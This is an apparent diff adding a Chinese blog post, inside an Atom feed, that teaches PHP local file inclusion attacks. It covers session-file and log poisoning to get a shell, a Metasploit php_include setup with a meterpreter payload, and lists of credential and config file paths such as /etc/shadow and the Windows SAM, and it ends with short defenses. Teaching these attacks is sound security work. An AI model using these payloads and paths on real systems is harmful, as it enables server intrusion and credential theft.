+&lt;p&gt;session 的存储位置可以获取。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;通过 phpinfo 的信息可以获取到 session 的存储位置。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;另一种只能猜测了&lt;br /&gt;
+根据各版本的中间件猜测。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;session 中的内容可以被控制，传入恶意代码。&lt;/span&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;示例代码&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;str&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;s&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;漏洞分析&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。&lt;/p&gt;
+&lt;p&gt;当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。&lt;/p&gt;
+&lt;p&gt;session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到 666 已经存里面了&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;漏洞利用&lt;/span&gt;&lt;br /&gt;
+通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。&lt;/p&gt;
+&lt;p&gt;当访问 http://www.xxx.com/x.php?str=&amp;lt;?php phpinfo ();?&amp;gt; 后，会在 /var/lib/php5 目录下存储 session 的值。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;结果&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;文件包含日志&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含日志&#34;&gt;#&lt;/a&gt; 文件包含日志&lt;/h2&gt;
+&lt;p&gt;利用条件：需要知道服务器日志的存储路径，且日志文件可读。&lt;/p&gt;
+&lt;p&gt;很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;示例&lt;/span&gt;&lt;br /&gt;
+&lt;img data-src=&#34;image014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️还可以在 User-Agent 里插入 payload&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image015.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;💔有的日志文件里不一定会显示 UA 信息&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;label info&#34;&gt;示例&lt;/span&gt;&lt;br /&gt;
+&lt;img data-src=&#34;image017.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+这是因为 Apache 配置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;详情见：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIxLzAxLzIyL2FwYWNoZSVFOCVBRSVCRiVFOSU5NyVBRSVFNiU5NyVBNSVFNSVCRiU5NyVFOCVBRiVBNiVFOCVBNyVBMyVFMyU4MCU5MCVFOCVCRCVBQyVFMyU4MCU5MS8=&#34;&gt;https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;msf-攻击模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-攻击模块&#34;&gt;#&lt;/a&gt; MSF 攻击模块&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;举个例子&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/unix/webapp/php_include&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.199.12&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rport &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; phpuri /index.php?file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;xxLFIxx&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; path http://192.168.199.147/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload php/meterpreter/bind_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; srvport &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit -z&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;常见的敏感信息路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的敏感信息路径&#34;&gt;#&lt;/a&gt; 常见的敏感信息路径&lt;/h1&gt;
+&lt;h2 id=&#34;windows系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows系统&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;Windows 系统&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;c:\boot.ini// 查看系统版本&lt;/p&gt;
+&lt;p&gt;c:\windows\system32\inetsrv\MetaBase.xml// IIS 配置文件&lt;/p&gt;
+&lt;p&gt;c:\windows\repair\sam // 存储 Windows 系统初次安装的密码&lt;/p&gt;
+&lt;p&gt;c:\ProgramFiles\mysql\my.ini// MySQL 配置&lt;/p&gt;
+&lt;p&gt;c:\ProgramFiles\mysql\data\mysql\user.MYD// MySQL root 密码&lt;/p&gt;
+&lt;p&gt;c:\windows\php.ini//php 配置信息&lt;/p&gt;
+&lt;h2 id=&#34;linuxunix系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linuxunix系统&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;Linux/Unix 系统&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;/etc/passwd// 账户信息&lt;/p&gt;
+&lt;p&gt;/etc/shadow// 账户密码文件&lt;/p&gt;
+&lt;p&gt;/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件&lt;/p&gt;
+&lt;p&gt;/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置&lt;/p&gt;
+&lt;p&gt;/usr/local/app/php5/lib/php.ini// PHP 相关配置&lt;/p&gt;
+&lt;p&gt;/etc/httpd/conf/httpd.conf// Apache 配置文件&lt;/p&gt;
+&lt;p&gt;/etc/my.conf//mysql 配置文件&lt;/p&gt;
+&lt;h2 id=&#34;日志默认路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志默认路径&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;日志默认路径&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;apache+Linux 日志默认路径&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/httpd/logs/access_log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;或者&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/var/log/httpd/access log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;apache+win2003 日志默认路径&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;D:/xampp/apache/logs/access.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;D:/xampp/apache/logs/error.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;IIS6.0+win2003 默认日志文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:/WINDOWS/system32/Logfiles&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;IIS7.0+win2003 默认日志文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;%SystemDrive%/inetpub/logs/LogFiles&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;nginx 日志文件在用户安装目录的 logs 目录下&lt;/p&gt;
+&lt;p&gt;如安装目录为 /usr/local/nginx, 则日志目录就是在&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/local/nginx/logs&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;也可通过其配置文件 Nginx.conf，获取到日志的存在路径&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/opt/nginx/logs/access.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;web 中间件默认配置&lt;/p&gt;
+&lt;p&gt;apache+linux 默认配置文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/httpd/conf/httpd.conf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;或者&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;index.php?page=/etc/init.d/httpd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;IIS6.0+win2003 配置文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:/Windows/system32/inetsrv/metabase.xml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;IIS7.0+WIN 配置文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:/Windows/System32/inetsrv/config/application/Host.config&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;文件包含漏洞的防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含漏洞的防御&#34;&gt;#&lt;/a&gt; 文件包含漏洞的防御&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;PHP 中使用 open_basedir 配置限制访问在指定的区域&lt;/li&gt;
+&lt;li&gt;过滤.（点）/（反斜杠）\（反斜杠）&lt;/li&gt;
+&lt;li&gt;禁止服务器远程文件包含&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;参考&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考&#34;&gt;#&lt;/a&gt; 参考&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s&#34;&gt;https://www.freebuf.com/articles/web/182280.html&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=&#34;&gt;https://www.php.cn/toutiao-414790.html&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=&#34;&gt;https://blog.csdn.net/ni9htmar3/article/details/69812306&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="文件包含" />
+        <updated>2021-01-20T04:12:47.000Z</updated>
+    </entry>
+</feed>
